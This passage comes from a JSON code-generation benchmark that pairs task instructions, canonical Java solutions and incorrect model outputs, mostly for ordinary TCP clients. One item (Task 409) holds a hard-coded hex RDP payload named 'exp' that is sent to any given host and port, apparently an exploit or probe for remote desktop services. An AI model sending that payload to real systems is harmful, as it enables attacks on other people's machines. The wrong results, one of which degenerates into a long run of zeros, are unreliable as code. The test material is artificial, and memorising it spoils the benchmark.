NioSocketConnector();\n                mSocketConnector.setConnectTimeoutCheckInterval(10000);\n                mSocketConnector.getFilterChain().addLast(\"codec\", new HttpClientCodec());\n                mSocketConnector.setHandler(new IcecastHTTPIOHandler());\n            }\n\n            mStreamingSession = null;\n\n            try {\n                ConnectFuture future = mSocketConnector.connect(\n                    new InetSocketAddress(getBroadcastConfiguration().getHost(),\n                    getBroadcastConfiguration().getPort()));\n                future.awaitUninterruptibly();\n                mStreamingSession = future.getSession();\n            } catch(RuntimeIoException rie) {\n                Throwable throwableCause = rie.getCause();\n                if(throwableCause instanceof ConnectException) {\n                    setBroadcastState(BroadcastState.NO_SERVER);\n                } else {\n                    setBroadcastState(BroadcastState.DISCONNECTED);\n                    mLog.debug(\"Failed to connect\", rie);\n                }\n                disconnect();\n            }\n            mConnecting.set(false);\n        }\n        return connected();\n    }\n\n    public void disconnect() {\n        if(mStreamingSession != null) {\n            mStreamingSession.closeNow();\n        }\n    }\n\n    public class IcecastHTTPIOHandler extends IoHandlerAdapter {\n        @Override\n        public void sessionOpened(IoSession session) throws Exception {\n            HttpRequestImpl request = new HttpRequestImpl(HttpVersion.HTTP_1_1, HttpMethod.PUT,\n                getConfiguration().getMountPoint(), \"\", getHTTPHeaders());\n            session.write(request);\n        }\n\n        @Override\n        public void sessionClosed(IoSession session) throws Exception {\n            if(!getBroadcastState().isErrorState()) {\n                setBroadcastState(BroadcastState.DISCONNECTED);\n            }\n            mSocketConnector.dispose();\n            mStreamingSession = null;\n            mSocketConnector = null;\n            mConnecting.set(false);\n        }\n\n        @Override\n        public void exceptionCaught(IoSession session, Throwable throwable) throws Exception {\n            if(throwable instanceof ProtocolDecoderException) {\n                setBroadcastState(BroadcastState.DISCONNECTED);\n            } else {\n                mLog.error(\"Broadcast error\", throwable);\n                setBroadcastState(BroadcastState.DISCONNECTED);\n            }\n            disconnect();\n            mConnecting.set(false);\n        }\n\n        @Override\n        public void messageReceived(IoSession session, Object object) throws Exception {\n            if(object instanceof DefaultHttpResponse) {\n                DefaultHttpResponse response = (DefaultHttpResponse) object;\n                switch(response.getStatus()) {\n                    case SUCCESS_OK:\n                        setBroadcastState(BroadcastState.CONNECTED);\n                        mConnecting.set(false);\n                        break;\n                    case CLIENT_ERROR_UNAUTHORIZED:\n                        setBroadcastState(BroadcastState.INVALID_CREDENTIALS);\n                        break;\n                    case CLIENT_ERROR_FORBIDDEN:\n                        setBroadcastState(BroadcastState.CONFIGURATION_ERROR);\n                        break;\n                    default:\n                        if(!getBroadcastState().isErrorState()) {\n                            setBroadcastState(BroadcastState.ERROR);\n                        }\n                        break;\n                }\n                disconnect();\n            }\n        }\n    }\n\n    // Helper methods (stubs for compilation)\n    private boolean connected() { return false; }\n    private boolean canConnect() { return false; }\n    private IcecastHTTPConfiguration getBroadcastConfiguration() { return null; }\n    private void setBroadcastState(BroadcastState state) {}\n    private BroadcastState getBroadcastState() { return null; }\n    private Map<String,String> getHTTPHeaders() { return null; }\n    private IcecastHTTPConfiguration getConfiguration() { return null; }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 10,
    "wrong_result": "```java\nimport org.apache.mina.core.future.ConnectFuture;\nimport org.apache.mina.core.session.IoSession;\nimport org.apache.mina.filter.codec.ProtocolCodecFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketConnector;\n\nimport java.net.InetSocketAddress;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class IcecastHTTPAudioBroadcaster {\n    private final Logger mLog;\n    private static final long RECONNECT_INTERVAL_MILLISECONDS = 30000;\n    private final NioSocketConnector mSocketConnector;\n    private IoSession mStreamingSession;\n    private final AtomicBoolean mConnecting;\n    private long mLastConnectionAttempt;\n\n    public IcecastHTTPAudioBroadcaster(IcecastHTTPConfiguration configuration) {\n        mLog = new Logger();\n        mSocketConnector = new NioSocketConnector();\n        mConnecting = new AtomicBoolean(false);\n        mLastConnectionAttempt = 0;\n    }\n\n    public boolean connect() {\n        if (!canConnect()) {\n            return false;\n        }\n        mConnecting.set(true);\n        ConnectFuture future = mSocketConnector.connect(new InetSocketAddress(\"localhost\", 8000));\n        future.addListener((ConnectFutureListener) future1 -> {\n            if (future1.isConnected()) {\n                mStreamingSession = future1.getSession();\n                mConnecting.set(false);\n                mLastConnectionAttempt = System.currentTimeMillis();\n                mLog.info(\"Connected to Icecast server\");\n            } else {\n                mConnecting.set(false);\n                mLog.error(\"Failed to connect to Icecast server\");\n            }\n        });\n        return true;\n    }\n\n    public void disconnect() {\n        if (mStreamingSession != null && mStreamingSession.isConnected()) {\n            mStreamingSession.closeNow();\n            mStreamingSession = null;\n            mLog.info(\"Disconnected from Icecast server\");\n        }\n    }\n\n    public boolean connected() {\n        return mStreamingSession != null && mStreamingSession.isConnected();\n    }\n\n    public boolean canConnect() {\n        if (mConnecting.get()) {\n            return false;\n        }\n        long currentTime = System.currentTimeMillis();\n        if (currentTime - mLastConnectionAttempt < RECONNECT_INTERVAL_MILLISECONDS) {\n            return false;\n        }\n        return true;\n    }\n\n    public IcecastHTTPConfiguration getBroadcastConfiguration() {\n        return new IcecastHTTPConfiguration();\n    }\n\n    public void setBroadcastState(BroadcastState state) {\n        // Implementation for setting broadcast state\n    }\n\n    public BroadcastState getBroadcastState() {\n        return BroadcastState.IDLE;\n    }\n\n    public Map<String, String> getHTTPHeaders() {\n        return Map.of(\"Content-Type\", \"audio/mpeg\", \"Ice-User-Agent\", \"Java Audio Broadcaster\");\n    }\n\n    public IcecastHTTPConfiguration getConfiguration() {\n        return new IcecastHTTPConfiguration();\n    }\n\n    private class IcecastHTTPIOHandler extends IoHandlerAdapter {\n        @Override\n        public void sessionOpened(IoSession session) {\n            String headers = \"PUT / HTTP/1.1\\r\\n\" +\n                    \"Host: localhost:8000\\r\\n\" +\n                    \"Content-Type: audio/mpeg\\r\\n\" +\n                    \"Ice-User-Agent: Java Audio Broadcaster\\r\\n\" +\n                    \"\\r\\n\";\n            session.write(headers);\n        }\n\n        @Override\n        public void sessionClosed(IoSession session) {\n            mStreamingSession = null;\n            mLog.info(\"Session closed\");\n        }\n\n        @Override\n        public void exceptionCaught(IoSession session, Throwable throwable) {\n            mLog.error(\"Exception caught: \" + throwable.getMessage());\n            session.closeNow();\n        }\n\n        @Override\n        public void messageReceived(IoSession session, Object object) {\n            String response = (String) object;\n            mLog.info(\"Received response: \" + response);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 403,
    "Instruction": "Task Description: Create a function that sends a string to a server using TCP socket communication.\n\nFunction Description: The function establishes a TCP connection to a specified server and port, sends a string message, then closes the connection. It handles potential IO exceptions by printing formatted error information.\n\nInput: \n- str: String - The message to be sent to the server\n\nOutput: None (The function has no return value but may print error information to stderr if the operation fails)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.util.Arrays;\n\npublic static void socketSend(String str) {\n    try {\n        Socket socket = new Socket(\"127.0.0.1\", 5327);\n        OutputStream out = socket.getOutputStream();\n        out.write(str.getBytes());\n        out.close();\n    } catch (IOException e) {\n        System.err.println(e.toString()+\"\\n\"+ Arrays.toString(e.getStackTrace())\n                .replace(\"[\",\"   at \")\n                .replace(\",\",\"\\n   at\")\n                .replace(\"]\",\"\"));\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "```python\nimport socket\n\ndef send_tcp_message(message, host, port):\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((host, port))\n            s.sendall(message.encode())\n    except socket.error as e:\n        print(f\"Socket error: {e}\", file=sys.stderr)\n```"
  },
  {
    "Task_id": 404,
    "Instruction": "Task Description: Create a TCP client class in Java that can establish a connection to a server, send requests, and receive responses.\n\nClass Description: The TcpClient class provides functionality to connect to a TCP server, send string requests, and receive string responses. It handles socket creation, data transmission, and resource cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the server to connect to\n- port: int - The port number on which the server is listening\n- TAG: String - A constant for logging purposes (default value: \"HttpGet\")\n\nMethods:\n- TcpClient(String host, int port) -> None - Constructor that initializes the host and port attributes\n- sendRequest(String request) -> String - Sends the request string to the server and returns the response\n- readStream(InputStream in) -> String - Helper method that reads data from an input stream and returns it as a string",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TcpClient {\n\n    private static final String TAG = \"HttpGet\";\n    private String host;\n    private int port;\n\n    public TcpClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String sendRequest(String request) {\n        Socket socket = null;\n        String data = \"\";\n\n        try {\n            socket = new Socket(host, port);\n            PrintWriter pw = new PrintWriter(new OutputStreamWriter(\n                    socket.getOutputStream()), true);\n            pw.println(request);\n\n            data = readStream(socket.getInputStream());\n\n        } catch (UnknownHostException exception) {\n            exception.printStackTrace();\n        } catch (IOException exception) {\n            exception.printStackTrace();\n        } finally {\n            if (null != socket)\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n        }\n        return data;\n    }\n\n    private String readStream(InputStream in) {\n        BufferedReader reader = null;\n        StringBuffer data = new StringBuffer();\n        try {\n            reader = new BufferedReader(new InputStreamReader(in));\n            String line = \"\";\n            while ((line = reader.readLine()) != null) {\n                data.append(line);\n            }\n        } catch (IOException e) {\n            Log.e(TAG, \"IOException\");\n        } finally {\n            if (reader != null) {\n                try {\n                    reader.close();\n                } catch (IOException e) {\n                    Log.e(TAG, \"IOException\");\n                }\n            }\n        }\n        return data.toString();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TcpClient {\n    private String host;\n    private int port;\n    private static final String TAG = \"HttpGet\";\n\n    public TcpClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public String sendRequest(String request) {\n        try (Socket socket = new Socket(host, port);\n             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n\n            out.println(request);\n            return readStream(socket.getInputStream());\n        } catch (IOException e) {\n            System.err.println(TAG + \": Error sending request: \" + e.getMessage());\n            return null;\n        }\n    }\n\n    private String readStream(InputStream in) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(in));\n        StringBuilder response = new StringBuilder();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.append(line).append(\"\\n\");\n        }\n        return response.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 405,
    "Instruction": "Task Description: Create a Java class that implements a TCP client for pushing metrics to a Graphite server, with support for periodic pushing and character sanitization for Graphite compatibility.\n\nClass Description: The Graphite class provides functionality to connect to a Graphite server via TCP and push metrics from a CollectorRegistry. It handles character sanitization for Graphite compatibility and supports both one-time pushes and periodic pushing via a daemon thread.\n\nAttributes:\n- host: String - The hostname or IP address of the Graphite server\n- port: int - The port number of the Graphite server\n- logger: Logger - Logger instance for error logging\n- INVALID_GRAPHITE_CHARS: Pattern - Regular expression pattern for invalid Graphite characters\n\nMethods:\n- Graphite(String host, int port) -> None - Constructor that initializes the Graphite client with server connection details\n- push(CollectorRegistry registry) -> void - Pushes all metrics from the registry to Graphite server immediately. Throws IOException if connection fails\n- start(CollectorRegistry registry) -> Thread - Starts a daemon thread that pushes metrics every 60 seconds\n- start(CollectorRegistry registry, int intervalSeconds) -> Thread - Starts a daemon thread that pushes metrics at specified intervals\n- PushThread(CollectorRegistry registry, int intervalSeconds) -> None - Inner class constructor for the periodic push thread\n- run() -> void - The main execution method of PushThread that handles periodic metric pushing",
    "Canonical_solution": "import io.prometheus.client.Collector;\nimport io.prometheus.client.CollectorRegistry;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.Socket;\nimport java.nio.charset.Charset;\nimport java.util.Collections;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\nimport java.util.regex.Pattern;\nimport java.util.regex.Matcher;\n\npublic class Graphite {\n  private static final Logger logger = Logger.getLogger(Graphite.class.getName());\n  private final String host;\n  private final int port;\n  private static final Pattern INVALID_GRAPHITE_CHARS = Pattern.compile(\"[^a-zA-Z0-9_-]\");\n\n  public Graphite(String host, int port) {\n    this.host = host;\n    this.port = port;\n  }\n\n  public void push(CollectorRegistry registry) throws IOException {\n    Socket s = new Socket(host, port);\n    BufferedWriter writer = new BufferedWriter(new PrintWriter(new OutputStreamWriter(s.getOutputStream(), Charset.forName(\"UTF-8\")));\n    Matcher m = INVALID_GRAPHITE_CHARS.matcher(\"\");\n    long now = System.currentTimeMillis() / 1000;\n    for (Collector.MetricFamilySamples metricFamilySamples: Collections.list(registry.metricFamilySamples())) {\n      for (Collector.MetricFamilySamples.Sample sample: metricFamilySamples.samples) {\n        m.reset(sample.name);\n        writer.write(m.replaceAll(\"_\"));\n        for (int i = 0; i < sample.labelNames.size(); ++i) {\n          m.reset(sample.labelValues.get(i));\n          writer.write(\";\" + sample.labelNames.get(i) + \"=\" + m.replaceAll(\"_\"));\n        }\n        writer.write(\" \" + sample.value + \" \" + now + \"\\n\");\n      }\n    }\n    writer.close();\n    s.close();\n  }\n\n  public Thread start(CollectorRegistry registry) {\n    return start(registry, 60);\n  }\n\n  public Thread start(CollectorRegistry registry, int intervalSeconds) {\n    Thread thread = new PushThread(registry, intervalSeconds);\n    thread.setDaemon(true);\n    thread.start();\n    return thread;\n  }\n\n  private class PushThread extends Thread {\n    private final CollectorRegistry registry;\n    private final int intervalSeconds;\n\n    PushThread(CollectorRegistry registry, int intervalSeconds) {\n      this.registry = registry;\n      this.intervalSeconds = intervalSeconds;\n    }\n\n    public void run() {\n      long waitUntil = System.currentTimeMillis();\n      while (true) {\n        try {\n          push(registry);\n        } catch (IOException e) {\n          logger.log(Level.WARNING, \"Exception \" + e + \" pushing to \" + host + \":\" + port, e);\n        }\n\n        long now = System.currentTimeMillis();\n        while (now >= waitUntil) {\n          waitUntil += intervalSeconds * 1000;\n        }\n        try {\n          Thread.sleep(waitUntil - now);\n        } catch (InterruptedException e) {\n          return;\n        }\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport io.prometheus.client.CollectorRegistry;\nimport io.prometheus.client.exporter.common.TextFormat;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.nio.charset.StandardCharsets;\nimport java.util.logging.Logger;\nimport java.util.regex.Pattern;\n\npublic class Graphite {\n    private final String host;\n    private final int port;\n    private final Logger logger;\n    private static final Pattern INVALID_GRAPHITE_CHARS = Pattern.compile(\"[^a-zA-Z0-9_.-]\");\n\n    public Graphite(String host, int port) {\n        this.host = host;\n        this.port = port;\n        this.logger = Logger.getLogger(Graphite.class.getName());\n    }\n\n    public void push(CollectorRegistry registry) throws IOException {\n        String metrics = TextFormat.outputToText(registry);\n        String sanitizedMetrics = sanitizeMetrics(metrics);\n        try (Socket socket = new Socket()) {\n            socket.connect(new InetSocketAddress(host, port), 5000);\n            try (OutputStream out = socket.getOutputStream()) {\n                out.write(sanitizedMetrics.getBytes(StandardCharsets.UTF_8));\n                out.flush();\n            }\n        } catch (IOException e) {\n            logger.severe(\"Failed to push metrics to Graphite: \" + e.getMessage());\n            throw e;\n        }\n    }\n\n    public Thread start(CollectorRegistry registry) {\n        return start(registry, 60);\n    }\n\n    public Thread start(CollectorRegistry registry, int intervalSeconds) {\n        PushThread thread = new PushThread(registry, intervalSeconds);\n        thread.setDaemon(true);\n        thread.start();\n        return thread;\n    }\n\n    private class PushThread extends Thread {\n        private final CollectorRegistry registry;\n        private final int intervalSeconds;\n\n        public PushThread(CollectorRegistry registry, int intervalSeconds) {\n            this.registry = registry;\n            this.intervalSeconds = intervalSeconds;\n        }\n\n        @Override\n        public void run() {\n            while (!isInterrupted()) {\n                try {\n                    push(registry);\n                    Thread.sleep(intervalSeconds * 1000);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                    break;\n                } catch (IOException e) {\n                    logger.severe(\"Error during periodic push: \" + e.getMessage());\n                }\n            }\n        }\n    }\n\n    private String sanitizeMetrics(String metrics) {\n        StringBuilder sanitized = new StringBuilder();\n        for (String line : metrics.split(\"\\n\")) {\n            String[] parts = line.split(\" \");\n            if (parts.length > 0) {\n                String name = parts[0];\n                String sanitizedName = INVALID_GRAPHITE_CHARS.matcher(name).replaceAll(\"_\");\n                sanitized.append(sanitizedName);\n                for (int i = 1; i < parts.length; i++) {\n                    sanitized.append(\" \").append(parts[i]);\n                }\n                sanitized.append(\"\\n\");\n            }\n        }\n        return sanitized.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 406,
    "Instruction": "Task Description: Write a Java function that tests a server's handling of a malformed HTTP request by sending a bad request and verifying the server's response.\n\nFunction Description: The function `testBadRequest` attempts to send a deliberately malformed HTTP POST request to a server and verifies that the server responds with a \"400 Bad Request\" error. The function creates a TCP socket connection to the server, sends the malformed request, reads the server's response, and compares it to the expected response. If the response matches, the test passes; otherwise, it may throw an IOException if the connection is closed prematurely.\n\nInput: None (The server address and port are obtained from `DefaultServer.getDefaultServerAddress()` internally)\n\nOutput: None (The function asserts the server's response matches the expected \"400 Bad Request\" response. Any mismatch or IOException will result in a test failure or exception.)",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.Socket;\n\npublic void testBadRequest() throws IOException {\n    String request = \"POST /\\r HTTP/1.1\\r\\nTrailer:foo, bar\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n9\\r\\nabcdefghi\\r\\n0\\r\\nfoo: fooVal\\r\\n bar: barVal\\r\\n\\r\\n\";\n    String response1 = \"HTTP/1.1 400 Bad Request\\r\\nContent-Length: 0\\r\\nConnection: close\\r\\n\\r\\n\";\n    Socket s = new Socket(DefaultServer.getDefaultServerAddress().getAddress(), DefaultServer.getDefaultServerAddress().getPort());\n    try {\n        s.getOutputStream().write(request.getBytes());\n\n        StringBuilder sb = new StringBuilder();\n        int read = 0;\n        byte[] buf = new byte[100];\n        while (read < response1.length()) {\n            int r = s.getInputStream().read(buf);\n            if (r <= 0) break;\n            if (r > 0) {\n                read += r;\n                sb.append(new String(buf, 0, r));\n            }\n        }\n        Assert.assertEquals(response1, sb.toString());\n\n    } catch (IOException expected) {\n        //this can happen as well, as in some cases we may not have fully consumed the read side\n        //before the connection is shutdown, namely when we are running in test.single\n    } finally {\n        s.close();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\npublic void testBadRequest() throws IOException {\n    String serverAddress = DefaultServer.getDefaultServerAddress();\n    int port = 80;\n    try (Socket socket = new Socket(serverAddress, port)) {\n        PrintWriter out = new PrintWriter(socket.getOutputStream());\n        out.print(\"POST / HTTP/1.1\\r\\n\");\n        out.print(\"Host: \" + serverAddress + \"\\r\\n\");\n        out.print(\"Content-Length: 100\\r\\n\");\n        out.print(\"\\r\\n\");\n        out.flush();\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n        String responseLine = in.readLine();\n        if (responseLine == null || !responseLine.startsWith(\"HTTP/1.1 400\")) {\n            throw new IOException(\"Expected 400 Bad Request, but received: \" + responseLine);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 407,
    "Instruction": "Task Description: Create a Java class that acts as a TCP client within a servlet context, handling HTTP requests by forwarding them to a specified server via TCP and returning the server's response.\n\nClass Description: The Lisplet class extends HttpServlet to handle HTTP POST requests. It establishes a TCP connection to a specified host and port, sends the HTTP request data in a custom format, processes the server's response, and returns it to the client.\n\nAttributes:\n- host: String - The hostname or IP address of the TCP server to connect to\n- port: int - The port number of the TCP server to connect to\n\nMethods:\n- doPost(HttpServletRequest req, HttpServletResponse resp) -> void - Handles HTTP POST requests by establishing a TCP connection, sending the request, processing the response, and closing the connection\n- transferResponseBody(HttpServletResponse resp, PushbackInputStream strm) -> void - Transfers the response body from the server to the HTTP response output stream\n- getResponseHeader(HttpServletRequest req, HttpServletResponse resp, PushbackInputStream strm) -> boolean - Reads and processes the response header from the server\n- sendRequest(HttpServletRequest req, Writer writer) -> void - Formats and sends the HTTP request data to the server\n- writeTagValuePair(Writer writer, String tag, String value) -> void - Helper method to write tag-value pairs in the custom request format",
    "Canonical_solution": "import java.io.*;\nimport java.net.*;\nimport javax.servlet.http.*;\n\npublic class Lisplet extends HttpServlet {\n    private String host;\n    private int port;\n\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp)\n            throws ServletException, IOException {\n        Socket socket = new Socket(host, port);\n        try {\n            Writer writer = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n            sendRequest(req, writer);\n            PushbackInputStream strm = new PushbackInputStream(\n                    new BufferedInputStream(socket.getInputStream()));\n            if(getResponseHeader(req, resp, strm))\n                transferResponseBody(resp, strm);\n        } finally {\n            socket.close();\n        }\n    }\n\n    protected void transferResponseBody(HttpServletResponse resp, PushbackInputStream strm)\n            throws ServletException, IOException {\n        OutputStream outs = resp.getOutputStream();\n        int b;\n        while((b = strm.read()) != -1)\n            outs.write(b);\n        outs.flush();\n    }\n\n    protected boolean getResponseHeader(HttpServletRequest req, HttpServletResponse resp, PushbackInputStream strm)\n        throws ServletException, IOException {\n        ArrayList list = readSexpr(strm);\n        return processResponse(req, resp, list);\n    }\n\n    protected void sendRequest(HttpServletRequest req, Writer writer)\n            throws IOException {\n        writer.write(\"(\");\n        writeTagValuePair(writer, \"method\", req.getMethod());\n        writeTagValuePair(writer, \"uri\", req.getRequestURI());\n        writeTagValuePair(writer, \"protocol\", req.getProtocol());\n        writer.write(\")\");\n        writer.flush();\n    }\n\n    protected void writeTagValuePair(Writer writer, String tag, String value)\n            throws IOException {\n        writer.write(\"(\");\n        writer.write(tag);\n        writer.write(\" \");\n        writer.write(\"\\\"\");\n        writer.write(value.replaceAll(\"\\\\\\\\\",\"\\\\\\\\\\\\\\\\\").replaceAll(\"\\\"\",\"\\\\\\\\\\\"\"));\n        writer.write(\"\\\"\");\n        writer.write(\")\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "wrong_result": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\nimport java.net.*;\n\npublic class Lisplet extends HttpServlet {\n    private String host;\n    private int port;\n\n    public Lisplet(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    @Override\n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        try (Socket socket = new Socket(host, port);\n             PrintWriter writer = new PrintWriter(socket.getOutputStream());\n             PushbackInputStream strm = new PushbackInputStream(socket.getInputStream())) {\n\n            sendRequest(req, writer);\n            writer.flush();\n\n            if (getResponseHeader(req, resp, strm)) {\n                transferResponseBody(resp, strm);\n            }\n        } catch (Exception e) {\n            resp.sendError(HttpServletResponse.SC_BAD_GATEWAY, \"Error forwarding request\");\n        }\n    }\n\n    private void transferResponseBody(HttpServletResponse resp, PushbackInputStream strm) throws IOException {\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        try (OutputStream out = resp.getOutputStream()) {\n            while ((bytesRead = strm.read(buffer)) != -1) {\n                out.write(buffer, 0, bytesRead);\n            }\n        }\n    }\n\n    private boolean getResponseHeader(HttpServletRequest req, HttpServletResponse resp, PushbackInputStream strm) throws IOException {\n        StringBuilder header = new StringBuilder();\n        int c;\n        while ((c = strm.read()) != -1) {\n            header.append((char) c);\n            if (header.length() >= 4 && header.substring(header.length() - 4).equals(\"\\r\\n\\r\\n\")) {\n                break;\n            }\n        }\n\n        if (header.length() == 0) {\n            return false;\n        }\n\n        String[] lines = header.toString().split(\"\\r\\n\");\n        for (String line : lines) {\n            if (line.startsWith(\"HTTP/\")) {\n                String[] parts = line.split(\" \");\n                if (parts.length >= 2) {\n                    resp.setStatus(Integer.parseInt(parts[1]));\n                }\n            } else if (line.contains(\":\")) {\n                String[] pair = line.split(\": \", 2);\n                if (pair.length == 2) {\n                    resp.setHeader(pair[0], pair[1]);\n                }\n            }\n        }\n\n        return true;\n    }\n\n    private void sendRequest(HttpServletRequest req, Writer writer) throws IOException {\n        writeTagValuePair(writer, \"Method\", req.getMethod());\n        writeTagValuePair(writer, \"Path\", req.getRequestURI());\n        writeTagValuePair(writer, \"Protocol\", req.getProtocol());\n\n        req.getHeaderNames().asIterator().forEachRemaining(name -> {\n            String value = req.getHeader(name);\n            writeTagValuePair(writer, \"Header\", name + \": \" + value);\n        });\n\n        writer.write(\"\\r\\n\");\n        writer.flush();\n\n        BufferedReader reader = req.getReader();\n        String line;\n        while ((line = reader.readLine()) != null) {\n            writer.write(line);\n            writer.write(\"\\r\\n\");\n        }\n        writer.write(\"\\r\\n\");\n        writer.flush();\n    }\n\n    private void writeTagValuePair(Writer writer, String tag, String value) throws IOException {\n        writer.write(\"<\" + tag + \">\");\n        writer.write(value);\n        writer.write(\"</\" + tag + \">\\r\\n\");\n    }\n}"
  },
  {
    "Task_id": 409,
    "Instruction": "Task Description: Create a Java function that sends a raw RDP (Remote Desktop Protocol) connection request to a specified host and port using TCP socket communication. The function should handle the socket connection, data transmission, and proper resource cleanup.\n\nFunction Description: The function establishes a TCP connection to a specified remote host and port, sends a pre-defined hexadecimal RDP protocol payload, and then closes the connection. The function includes error handling for connection issues and implements a socket timeout to prevent hanging.\n\nInput:\n- rhost: String - The remote host IP address or hostname to connect to\n- rport: int - The remote port number for the RDP service\n\nOutput: None (void function), though errors will be printed to standard error if they occur\n\nNote: The function uses a static hexadecimal string (exp) containing the RDP protocol payload, which is converted to bytes before transmission. The socket timeout is set to 3 milliseconds to prevent prolonged connection attempts.",
    "Canonical_solution": "import java.net.Socket;\nimport java.io.OutputStream;\n\npublic static String exp = \"030000130ee000000000000100080000000000030001d602f0807f658201940401010401010101ff30190204000000000204000000020204000000000204000000010204000000000204000000010202ffff020400000002301902040000000102040000000102040000000102040000000102040000000002040000000102020420020400000002301c0202ffff0202fc170202ffff0204000000010204000000000204000000010202ffff02040000000204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c00300000c02f08004010001000300000802f080280300000c02f08038000603ef0300000c02f08038000603eb0300000c02f08038000603ec0300000c02f08038000603ed0300000c02f08038000603ee0300000b06d00000123400\";\n\npublic void sendRDPRequest(String rhost, int rport) {\n    try {\n        byte[] bytes = HexUtils.hex2Bytes(exp);\n        Socket socket = new Socket(rhost, rport);\n        socket.setSoTimeout(3);\n        OutputStream out = socket.getOutputStream();\n        out.write(bytes);\n        out.flush();\n        out.close();\n        socket.close();\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 15,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\n\npublic class RDPConnector {\n    public static void sendRDPConnectionRequest(String rhost, int rport) {\n        String exp = \"0300000a0b0000000700000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000